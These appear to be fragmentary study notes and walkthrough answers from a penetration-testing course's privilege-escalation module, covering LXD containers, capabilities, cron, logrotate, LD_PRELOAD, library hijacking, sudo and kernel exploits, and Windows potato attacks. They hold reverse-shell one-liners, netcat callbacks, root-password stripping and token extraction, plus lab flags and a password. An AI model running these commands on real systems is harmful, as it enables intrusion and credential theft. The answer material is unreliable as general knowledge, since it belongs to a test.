#cat/UTILS #cpts
Import the local image.

```
:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lxc-lxd-4
#cat/UTILS #cpts
Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```
:~$ lxc init alpine r00t -c security.privileged=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lxc-lxd-5
#cat/UTILS #cpts
Mount the host file system.

```
:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - lxc-lxd-6
#cat/UTILS #cpts
Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we c

```
:~$ lxc start r00t
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - set-capability
#cat/UTILS #cpts
```
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - enumerating-capabilities
#cat/UTILS #cpts
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-capabilities
#cat/UTILS #cpts
```
getcap /usr/bin/vim.basic
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-capabilities-2
#cat/UTILS #cpts
For example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who r

```
cat /etc/passwd | head -n1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-capabilities-3
#cat/UTILS #cpts
We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```
/usr/bin/vim.basic /etc/passwd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploiting-capabilities-4
#cat/UTILS #cpts
We also can make these changes in a non-interactive mode:

```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - screen-version-identification
#cat/UTILS #cpts
```
screen -v
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - privilege-escalation---screen_exploitsh
#cat/UTILS #cpts
```
./screen_exploit.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - cron-job-abuse-2
#cat/UTILS #cpts
A quick look in the `/dmz-backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * *

```
ls -la /dmz-backups/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-daemon
#cat/UTILS #cpts
From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often

```
:~$ cd ContainerImages
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-daemon-2
#cat/UTILS #cpts
Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation

```
:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-daemon-3
#cat/UTILS #cpts
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolatio

```
:~$ lxc init ubuntutemp privesc -c security.privileged=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - linux-daemon-4
#cat/UTILS #cpts
Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```
:~# ls -l /mnt/root
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kubeletctl---extracting-pods
#cat/UTILS #cpts
```
:~$ kubeletctl -i --server 10.129.10.11 pods
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kubelet-api---available-commands
#cat/UTILS #cpts
```
:~$ kubeletctl -i --server 10.129.10.11 scan rce
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kubelet-api---executing-commands
#cat/UTILS #cpts
```
:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kubelet-api---extracting-tokens
#cat/UTILS #cpts
```
:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kubelet-api---extracting-certificates
#cat/UTILS #cpts
```
:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - pod-yaml
#cat/UTILS #cpts
```
apiVersion: v1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate
#cat/UTILS #cpts
* * * Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, t

```
d, --debug Don't do anything, just test and print debug messages
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-2
#cat/UTILS #cpts
* * * Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, t

```
f, --force Force file rotation
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-3
#cat/UTILS #cpts
* * * Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, t

```
s, --state=statefile Path of state file
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-4
#cat/UTILS #cpts
* * * Every Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, t

```
l, --log=logfile Log file or 'syslog' to log to syslog
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-5
#cat/UTILS #cpts
The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to em

```
cat /etc/logrotate.conf
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-6
#cat/UTILS #cpts
We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```
ls /etc/logrotate.d/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-7
#cat/UTILS #cpts
```
cat /etc/logrotate.d/dpkg
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-8
#cat/UTILS #cpts
Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to at

```
:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-9
#cat/UTILS #cpts
As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```
:~$ ./logrotten -p ./payload /tmp/tmp.log
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - logrotate-10
#cat/UTILS #cpts
```
...
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kernel-exploit-example
#cat/UTILS #cpts
```
cat /etc/lsb-release
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - kernel-exploit-example-2
#cat/UTILS #cpts
Next, we run the exploit and hopefully get dropped into a root shell.

```
./kernel_exploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-libraries
#cat/UTILS #cpts
* * * It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multip

```
:~$ ldd /bin/ls
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ld_preload-privilege-escalation
#cat/UTILS #cpts
Let's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, w

```
(root) NOPASSWD: /usr/sbin/apache2 restart
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ld_preload-privilege-escalation-2
#cat/UTILS #cpts
This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be

```
void _init() {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - ld_preload-privilege-escalation-3
#cat/UTILS #cpts
Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

```
:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking
#cat/UTILS #cpts
* * * Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

```
:~$ ls -la payroll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-2
#cat/UTILS #cpts
We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where

```
:~$ ldd payroll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-3
#cat/UTILS #cpts
The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take p

```
:~$ ls -la /development/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-4
#cat/UTILS #cpts
```
:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-5
#cat/UTILS #cpts
```
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-6
#cat/UTILS #cpts
We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.so`, which means that it is vulnerable. Executing the binary throws an err

```
void dbquery() {
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - shared-object-hijacking-7
#cat/UTILS #cpts
Executing the binary again should display the banner and pops a root shell.

```
:~$ ./payroll
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - importing-modules
#cat/UTILS #cpts
```
import pandas
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - python-script
#cat/UTILS #cpts
```
:~$ ls -l mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - python-script---contents
#cat/UTILS #cpts
```
import psutil
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - module-contents
#cat/UTILS #cpts
```
def virtual_memory():
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - privilege-escalation
#cat/UTILS #cpts
```
:~$ sudo /usr/bin/python3 ./mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - psutil-default-installation-location
#cat/UTILS #cpts
```
:~$ pip3 show psutil
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - misconfigured-directory-permissions
#cat/UTILS #cpts
```
:~$ ls -la /usr/lib/python3.8
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - hijacked-module-contents---psutilpy
#cat/UTILS #cpts
```
import os
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - privilege-escalation-via-hijacking-python-library-path
#cat/UTILS #cpts
```
File "mem_status.py", line 4, in <module>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - checking-sudo-permissions
#cat/UTILS #cpts
```
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - privilege-escalation-using-pythonpath-environment-variable
#cat/UTILS #cpts
```
:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo
#cat/UTILS #cpts
One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions: - 1.8.31 - Ubuntu 20.04 - 1.8.27 - Debian 10 - 1.9.2 - F

```
:~$ sudo -V | head -n1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-2
#cat/UTILS #cpts
When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

```
./sudo-hax-me-a-sandwich <len> <len> <len> <len>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-3
#cat/UTILS #cpts
We can find out which version of the operating system we are dealing with using the following command:

```
:~$ cat /etc/lsb-release
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-4
#cat/UTILS #cpts
Next, we specify the respective ID for the version operating system and run the exploit with our payload.

```
:~$ ./sudo-hax-me-a-sandwich 1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - sudo-policy-bypass
#cat/UTILS #cpts
Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```
:~$ sudo -u#-1 id
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - polkit
#cat/UTILS #cpts
* * * PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check

```
:~$ # pkexec -u <user> <cmd>
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - polkit-2
#cat/UTILS #cpts
Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.

```
:~$ ./poc
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - verify-kernel-version
#cat/UTILS #cpts
```
:~$ uname -r
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploitation
#cat/UTILS #cpts
```
:~$ ./exploit-1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - exploitation-2
#cat/UTILS #cpts
```
:~$ ./exploit-2 /usr/bin/sudo
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - audit
#cat/UTILS #cpts
Perform periodic security and configuration checks of all systems. There are several security baselines such as the DISA [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/) that can be fol

```
:~$ ./lynis audit system
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - audit-2
#cat/UTILS #cpts
The resulting scan will be broken down into warnings:

```
Warnings (2):
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - audit-3
#cat/UTILS #cpts
Suggestions:

```
Suggestions (53):
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - audit-4
#cat/UTILS #cpts
and an overal scan details section:

```
Lynis security scan details:
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - what-is-the-latest-python-version-that-is-installed-on-the-target
#cat/UTILS #cpts
Next, students should elevate from a Bourne shell to a Bash shell:

```
bash -i
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-using-capabilities-and-read-the-flagtxt-file-i
#cat/UTILS #cpts
Next, students need to enumerate binaries with set capabilities:

```
find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-using-capabilities-and-read-the-flagtxt-file-i-2
#cat/UTILS #cpts
```
:~$ find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-using-capabilities-and-read-the-flagtxt-file-i-3
#cat/UTILS #cpts
After saving the changes, students need to switch to the root user and read the flag:

```
cat /root/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-system-and-escalate-privileges-using-the-screen-
#cat/UTILS #cpts
Once successfully transferred, students need to run the exploit on the spawned target machine:

```
./41154.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-system-and-escalate-privileges-using-the-screen--2
#cat/UTILS #cpts
At last, students need to print out the contents of the flag file "flag.txt" located at `/root/screen_exploit`:

```
cat /root/screen_exploit/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-system-and-escalate-privileges-by-abusing-the-mi
#cat/UTILS #cpts
Subsequently, students need to edit the script `backup.sh` under the directory `/dmz-backups/` and append a reverse shell one-liner:

```
echo 'bash -i >& /dev/tcp/PWNIP/443 0>&1' >> /dmz-backups/backup.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-system-and-escalate-privileges-by-abusing-the-mi-2
#cat/UTILS #cpts
```
:~$ echo 'bash -i >& /dev/tcp/10.10.14.25/443 0>&1' >> /dmz-backups/backup.sh
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - connect-to-the-target-system-and-escalate-privileges-by-abusing-the-mi-3
#cat/UTILS #cpts
At last, students need to print out the contents of the flag file "flag.txt" at `/root/cron_abuse/`:

```
cat /root/cron_abuse/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ
#cat/UTILS #cpts
Upon connecting, students need to inspect the contents of the ContainerImages directory:

```
cd ContainerImages/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-2
#cat/UTILS #cpts
Discovering the `alpine-v3.18-x86_64-20230607_1234.tar.gz` file, students need to import the image:

```
lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-3
#cat/UTILS #cpts
```
:~/ContainerImages$ lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-4
#cat/UTILS #cpts
After verifying that the image has been successfully imported, students need to initiate the image and configure it with the `security.privileged=true` flag. Additionally, students need to mount the `/root` directory fro

```
lxc init alpine-container privesc -c security.privileged=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-5
#cat/UTILS #cpts
```
:~/ContainerImages$ lxc init alpine-container privesc -c security.privileged=true
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-6
#cat/UTILS #cpts
Finally, students need to start the container and execute the shell interpreter `/bin/sh`:

```
lxc start privesc
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-7
#cat/UTILS #cpts
With the new root shell, students need to read the contents of the flag:

```
cat /mnt/root/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-8
#cat/UTILS #cpts
Subsequently, students need to write a payload to write the contents of `/root/flag.txt` to a file in their home directory:

```
echo "cat /root/flag.txt > /home/htb-student/flag.txt" > payload
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-9
#cat/UTILS #cpts
Finally, students need to make an edit to the`/home/htb-student/backups/access.log` log file and trigger the exploit:

```
echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-10
#cat/UTILS #cpts
```
:~/logrotten$ echo test >> /home/htb-student/backups/access.log; ./logrotten /home/htb-student/backups/access.log -p payload
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-11
#cat/UTILS #cpts
With the exploit effectively creating a copy of the root flag, students need to read its contents:

```
cat /home/htb-student/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten
#cat/UTILS #cpts
Now, students need return to the initial SSH session and run the exploit, obtaining a root shell:

```
./kernelExploit
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten-2
#cat/UTILS #cpts
Finally, students need to read the contents of the flag:

```
cat /root/kernel_exploit/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-privileges-using-ld_preload-technique-submit-the-contents-of-
#cat/UTILS #cpts
At last, students need to print out the contents of the flag at `/root/ld_preload`:

```
cat /root/ld_preload/flag.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - follow-the-examples-in-this-section-to-escalate-privileges-recreate-al
#cat/UTILS #cpts
To attain the flag without recreating all the examples/techniques taught in the section (which is highly discouraged), students need to use the `ldd` command with the `--version` option to check the version of `glibc`:

```
ldd --version
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - follow-along-with-the-examples-in-this-section-to-escalate-privileges-
#cat/UTILS #cpts
Next, students need to perform a quick enumeration of the environment:

```
cat mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - follow-along-with-the-examples-in-this-section-to-escalate-privileges--2
#cat/UTILS #cpts
```
(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - follow-along-with-the-examples-in-this-section-to-escalate-privileges--3
#cat/UTILS #cpts
Students need to open `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py` with vim:

```
vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - follow-along-with-the-examples-in-this-section-to-escalate-privileges--4
#cat/UTILS #cpts
Saving the changes, students need to run the `mem_status.py` script using sudo. The script successfully displays the flag, `HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}`:

```
sudo /usr/bin/python3 /home/htb-student/mem_status.py
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-12
#cat/UTILS #cpts
```
(ALL, !root) /bin/ncdu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-13
#cat/UTILS #cpts
Identifying that the `/bin/ncdu` binary can be ran as root, students need to check the man pages of the binary to identify possible privilege escalation vectors:

```
man -P cat ncdu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-14
#cat/UTILS #cpts
```
:~$ man -P cat ncdu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-15
#cat/UTILS #cpts
Option `b` will spawn a shell in the current directory. Now, students need to run `/bin/ncdu` with sudo, while specifying user ID `-1` (which processes into `0`, or the root user):

```
sudo -u#-1 /bin/ncdu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-16
#cat/UTILS #cpts
```
:~$ sudo -u#-1 /bin/ncdu
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-17
#cat/UTILS #cpts
Students need to check if the kernel version is vulnerable:

```
uname -r
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-18
#cat/UTILS #cpts
Confirming the vulnerability (as all kernel versions from 5.8 - 5.17 are vulnerable), students need to navigate into the transferred directory and use the first exploit version, \`exploit-1:

```
cd CVE-2022-0847-DirtyPipe-Exploits/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-19
#cat/UTILS #cpts
Confirming the vulnerability (as all kernel versions from 5.8 - 5.17 are vulnerable), students need to navigate into the transferred directory and use the first exploit version, \`exploit-1:

```
./exploit-1
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag1txt
#cat/UTILS #cpts
Within the `.config` directory, students will find a hidden file that contains the flag:

```
ls -lA .config/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag1txt-2
#cat/UTILS #cpts
```
:~$ ls -lA .config/
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag1txt-3
#cat/UTILS #cpts
Therefore, students need to print its contents out to attain the flag:

```
cat .config/.flag1.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag2txt
#cat/UTILS #cpts
Using the same SSH session established in the previous question, students need to use `cat` on the `.bash_history` file under the directory `/home/barry`, finding the password `i_l0ve_s3cur1ty!`:

```
cat /home/barry/.bash_history
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag2txt-2
#cat/UTILS #cpts
With the attained password, students need to switch users to `barry` then print out the second flag file "flag2.txt", found in `/home/barry/flag2.txt`:

```
cat /home/barry/flag2.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag3txt
#cat/UTILS #cpts
Therefore, `barry` can read the files under the directory `/var/log/`; students need to print out the contents of the flag file "flag3.txt", which is in the `/var/log/` directory:

```
cat /var/log/flag3.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag4txt
#cat/UTILS #cpts
At last, students need to print out the contents of "flag4.txt", which is in the directory `/var/lib/tomcat9/`:

```
cat /var/lib/tomcat9/flag4.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag5txt-3
#cat/UTILS #cpts
```
:/var/lib/tomcat9$ sudo busctl --show-machine
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - submit-the-contents-of-flag5txt-4
#cat/UTILS #cpts
```
cat /root/flag5.txt
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - check-windows-defender-status
#cat/UTILS #cpts
```
AMEngineVersion : 1.1.17900.7
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - list-applocker-rules
#cat/UTILS #cpts
```
PublisherConditions : {*\*\*,0.0.0.0-*}
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - test-applocker-policy
#cat/UTILS #cpts
```
FilePath PolicyDecision MatchingRule
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - tasklist
#cat/UTILS #cpts
```
cmd.exe 4132 N/A
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - patches-and-updates
#cat/UTILS #cpts
We can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.

```
Source Description HotFixID InstalledBy InstalledOn
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - installed-programs
#cat/UTILS #cpts
We can, of course, do this with PowerShell as well using the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) cmdlet.

```
Name Version
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - local-admin-user-rights---elevated
#cat/UTILS #cpts
If we run an elevated command window, we can see the complete listing of rights available to us:

```
winlpe-srv01\administrator
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - standard-user-rights
#cat/UTILS #cpts
```
winlpe-srv01\htb-student
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - backup-operators-rights
#cat/UTILS #cpts
```
PRIVILEGES INFORMATION
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalating-privileges-using-juicypotato
#cat/UTILS #cpts
To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - escalating-privileges-using-printspoofer
#cat/UTILS #cpts
Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catc

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

## Misc commands - Misc commands - Misc commands - Misc commands - Misc commands - remote-code-execution-as-system
#cat/UTILS #cpts
We can also leverage `SeDebugPrivilege` for [RCE](https://decoder.cloud/2018/02/02/getting-system/). Using this technique, we can elevate our privileges to SYSTEM by launching a [child process](https://docs.microsoft.com

```
Image Name PID Session Name Session# Mem Usage
```

